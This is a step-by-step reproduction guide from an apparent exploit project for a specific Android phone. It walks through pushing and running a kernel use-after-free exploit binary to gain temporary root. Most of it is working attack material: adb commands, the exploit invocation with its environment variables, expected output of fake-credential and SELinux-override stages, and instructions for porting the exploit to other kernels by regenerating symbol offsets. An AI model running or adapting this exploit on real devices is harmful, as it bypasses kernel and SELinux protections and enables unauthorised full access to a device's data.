# 11 · From-Scratch Reproduction Guide

[中文](../11-reproduce.md) · **English**

> This chapter is for someone holding the same device. Following it should reproduce the
> result. **If yours is a different model or kernel, read section 0 first.**

---

## ⚡ Quick path: one command

If you would rather not type it out, the repository ships a script (Windows / PowerShell):

```powershell
.\scripts\root.ps1                 # after a reboot: push -> self-test -> exploit (retried) -> verify
.\scripts\root.ps1 -ProbeOnly      # self-test only; the UAF is not triggered
.\scripts\root.ps1 -MaxAttempts 8  # when the odds are not on your side
```

What it does in each situation:

| Situation | Behaviour |
|---|---|
| kernel string does not match | exits immediately instead of guessing |
| `/data/local/tmp` was cleaned | compares SHA256 and re-pushes only what is missing or stale |
| already rooted | exits early (`-Force` re-runs anyway) |
| `--auto` fails | retries automatically — the last stage is probabilistic |
| a verification step fails | names which one |

**It never writes a partition, never touches the bootloader, and never kills the parked
holder process.**

The manual walkthrough follows, for when you want to know what each step actually does.

---

## 0. Scope check

```bash
./scripts/check-device.sh
```

Or manually:

```bash
adb shell getprop ro.product.device        # expect: flare
adb shell getprop ro.product.model         # expect: 24075RP89G
adb shell getprop ro.build.display.id      # expect: ...OS3.0.303.0.WHXMIXM...
adb shell uname -r                         # expect: 6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
adb shell getenforce                       # expect: Enforcing
adb shell getprop ro.boot.verifiedbootstate # expect: green
```

**The kernel string must match exactly** — the exploit profile is matched against the full
string.

**If your kernel string only shares a prefix but differs in commit:**
- try the existing binary first (it may fail)
- if it fails you must **regenerate the profile** (see section 6)

---

## 1. Preparation

### 1.1 Required files

| File | Source |
|---|---|
| `shark-k66118-fixed` | this repo's `artifacts/` |
| `ksud-3.3.1` | this repo's `artifacts/`, or extract `lib/arm64-v8a/libksud.so` from the KernelSU APK |
| KernelSU manager APK | [tiann/KernelSU v3.3.1 (32680)](https://github.com/tiann/KernelSU/releases/download/v3.3.1/KernelSU_v3.3.1_32680-release.apk) |

**⚠️ Versions must match**: manager v3.3.1 (32680) ↔ ksud 3.3.1 (uapi: 5).
ksud 3.1.0 with the 3.3.1 manager will misbehave.

### 1.2 Push to the device

```bash
adb push artifacts/shark-k66118-fixed /data/local/tmp/shark66118
adb push artifacts/ksud-3.3.1        /data/local/tmp/ksud33
adb shell 'chmod 755 /data/local/tmp/shark66118 /data/local/tmp/ksud33'
```

### 1.3 Install the KernelSU manager

```bash
adb install -r -g KernelSU_v3.3.1_32680-release.apk
```

Verify:

```bash
adb shell dumpsys package me.weishu.kernelsu | grep -E 'versionName|versionCode'
# versionCode=32680
# versionName=v3.3.1
```

### 1.4 (Optional) Install Shizuku

The Shark *app* needs Shizuku/Stellar. **The plain binary does not.**
We used the binary route, so this step can be skipped.

---

## 2. Self-check (zero risk)

First confirm the tracefs path works:

```bash
adb shell '/data/local/tmp/shark66118 probe'
```

**Expected output:**

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
[probe] pid=18234 cpu=2 uid=2000
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
PROBE_TIMER made=128 recs=128 site=0xffffffebc5415d48 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=21 best=0xffffff7fc0000000 count=330
PROBE_LINEAR_MAP=0xffffff7fc0000000
[cred] attempt=0 child=18236 R=0xffffff80c117a180 site_low=0x164064 recs=1 task=0xffffff807a40cb00 task_recs=1
PROBE_TASK=0xffffff807a40cb00 expected_low21=0xab93c
PROBE_CRED=0xffffff80c117a180 req=0xb8 alloc=0xc0 uid_off=0x8
PROBE_SELINUX_BLOB size=0x18 osid=0x0 sid=0x4 exec_sid=0x8 create_sid=0xc set=exec_sid/create_sid=1
PROBE_OK
```

### Interpreting it

| Output | Meaning | If wrong |
|---|---|---|
| `PROBE_TRACE=no` | tracefs cannot be opened | check whether shell is in the `readtracefs` group |
| `[calib] timers=0` | **KASLR low-21-bit problem** | see [chapter 09](09-root-cause.md) |
| `task_recs=0` | same | same |
| `PROBE_SLIDE=... aligned=0` | not 2MiB aligned | **this is normal; our fix handles it** |
| `PROBE_TIMER_FAIL` | timer events not captured | check whether `low_adj` is detected |

**`probe` mode is entirely harmless** — it only leaks and self-checks, never triggers the UAF.

---

## 3. Fire

```bash
adb shell "cd /data/local/tmp && \
  PYB110_KSUD=/data/local/tmp/ksud33 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KMI=android15-6.6 \
  ./shark66118 --auto"
```

### Environment variables

| Variable | Value | Purpose |
|---|---|---|
| `PYB110_KSUD` | `/data/local/tmp/ksud33` | path to the ksud binary |
| `PYB110_MANAGER_PKG` | `me.weishu.kernelsu` | KernelSU manager package name |
| `PYB110_KMI` | `android15-6.6` | our KMI |

### Expected successful output

```
[calib] timers=512 low_adj=0x80000
[base] best=0xffffff7fc0000000 count=202
[cred] R=0xffffff... task=0xffffff... task_recs=1
[+] stage fake_cred  ... burst hit=1
[+] stage selinux    ... burst hit=1
[ksu] panic_on_warn=0
[+] stage fake_uid   ... burst hit=1
[+] child report stage=2 uid=0 euid=0 resuid=0/0/0
PLANT_CRED_OK child=...
PARKED=1
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

### If it fails

```
[+] plant1 free_seen=1 burst hit=0
[-] plant1 burst missed; holding zombie
FAIL=fake-uid REASON=fake-uid
[!] failed plant zombies held -- parking without reap
```

**⇒ simply re-run the same command.** Failure is a probability issue, not a configuration issue.

**We measured roughly 2/3 success on a single run.**

---

## 4. Verification

```bash
# 1) kernel module
adb shell grep kernelsu /proc/modules
# expect: kernelsu 180224 4 - Live ...

# 2) root identity
adb shell su -c id
# expect: uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

# 3) full capability set
adb shell su -c 'grep Cap /proc/self/status'
# expect: CapPrm/CapEff/CapBnd = 000001ffffffffff

# 4) real access
adb shell su -c 'ls /data/adb'
adb shell su -c 'ls /data/data | head -3'
adb shell su -c 'cat /proc/kallsyms | head -2'

# 5) write test
adb shell su -c 'echo ok > /data/adb/t && cat /data/adb/t && rm /data/adb/t'
```

**All five passing = full root.**

---

## 5. Recovery / cleanup

### 5.1 Restore normality (just reboot)

```bash
adb reboot
```

**After reboot:**
- root is gone
- kernel module unloaded
- SELinux back to Enforcing
- device completely normal

**No persistent modification is left behind.**

### 5.2 If it gets stuck

If the `PARKED` process is holding memory:

```bash
adb shell 'ps -A | grep shark'      # find the holder
adb reboot                          # cleanest option
```

**⚠️ Do not manually kill the parked process** — once the fake-cred page it holds is freed,
a task in the kernel still points into it and it may crash.

---

## 6. Porting to another model or kernel

### 6.1 First decide whether the vulnerability exists

```
CVE-2026-98260 fix versions: 6.1.191 / 6.6.158 / 6.12.112 / 6.18.54 / 7.2.8
```

**But if your OEM backported the fix early, the version number will not tell you.
You must verify by disassembly.**

Criterion (see [chapter 02](02-methodology.md)): in `begin_new_exec`, check the position of
`posix_cpu_timers_exit` relative to `exec_task_namespaces`.

**Vulnerable: `posix_cpu_timers_exit` comes *after* `exec_task_namespaces`.**

### 6.2 Regenerate the profile

The profile structure in `K66118_plant.c`:

```c
struct k66118_profile {
    const char *release;              /* full uname -r string */
    unsigned long long timer_site;    /* do_timer_create+0xa8 link address */
    unsigned long long timer_low21;   /* same, low 21 bits */
    unsigned long long copy_low21;    /* copy_process+0x140 low 21 bits */
    unsigned long long selinux_state;
    unsigned long long panic_on_warn;
    unsigned long long root_user;
    unsigned long long init_user_ns;
    unsigned long long init_ucounts;
    unsigned long long init_groups;
};
```

**Extract them from the target kernel's vmlinux:**

```console
$ python tools/kcalls.py do_timer_create | grep kmem_cache_alloc
  0xffffffc080195d44  bl -> kmem_cache_alloc        # +0xa8 = 0x80195d48

$ python tools/kcalls.py copy_process | grep kmem_cache_alloc
  0xffffffc0800ab938  bl -> kmem_cache_alloc_node   # +0x140 = 0xab93c

$ python -c "look up selinux_state / root_user / init_user_ns / ... in the symbol table"
```

### 6.3 What else must be re-measured

| Parameter | Source |
|---|---|
| `KITIMER_BYTES` | `posix_timers_cache` objsize in `/proc/slabinfo` |
| `SLAB_OBJECTS` | `objperslab` in the same line |
| `KITIMER_NODE` | disassemble `posix_cpu_timers_exit` |
| `CRED_REQ` / `CRED_ALLOC` | `cred_jar` in slabinfo |
| `OFF_TASK_CRED` | BTF |
| `page_offset` / `MEMSTART_PFN` | `/proc/zoneinfo` + trace pairing |

**⚠️ And do not forget the pitfall from chapter 09: the low 21 bits must be compensated for
the slide.**

---

## 7. FAQ

### Q: `timers=0` forever

**A: 99% it is the KASLR low-21-bit problem.** See [chapter 09](09-root-cause.md).
Check whether the binary is our patched build:

```bash
adb shell 'strings /data/local/tmp/shark66118 | grep low_adj'
```

(Our build logs `low_adj=`.)

### Q: `LATE_LOAD_SKIP=env-missing`

**A: `PYB110_KSUD` is not set.** Add the environment variable.

### Q: `LATE_LOAD_RC` is non-zero

**A: ksud version does not match the manager.** Extract `lib/arm64-v8a/libksud.so` from the
manager APK.

### Q: `su: not found`

**A: the KSU module did not load.** Check `grep kernelsu /proc/modules`.

### Q: root is gone after a reboot

**A: normal.** This is temporary root. Re-run step 3.

### Q: Can it be made persistent?

**A: not without unlocking the bootloader.** We never write a partition, so nothing can
survive a reboot.

(In theory, once you have root you could research writing to partitions for a permanent
unlock, but that carries brick risk and this project does not do it.)
